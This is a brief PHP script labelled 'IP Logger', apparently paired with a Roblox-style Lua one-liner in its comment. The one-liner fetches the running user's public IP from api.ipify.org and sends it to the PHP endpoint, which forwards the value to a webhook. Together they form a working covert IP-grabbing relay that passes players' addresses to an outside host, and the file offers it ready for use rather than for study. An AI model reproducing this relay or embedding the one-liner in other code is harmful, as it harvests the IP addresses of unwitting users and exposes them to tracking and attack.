<?php
    //game:HttpGet('link_to_php_script?Content='+game:HttpGet('https://api.ipify.org'))
    if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["Content"])) {
        $Webhook = "webhook";
        $Content = $_GET["Content"];
        $json_data = json_encode([
            "content" => $Content,
            "username" => "IP Logger"
        ]);
        $ch = curl_init( $Webhook );
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt( $ch, CURLOPT_POST, 1);
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt( $ch, CURLOPT_HEADER, 0);
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec( $ch );
        echo $response;
        curl_close( $ch );
    }
?>
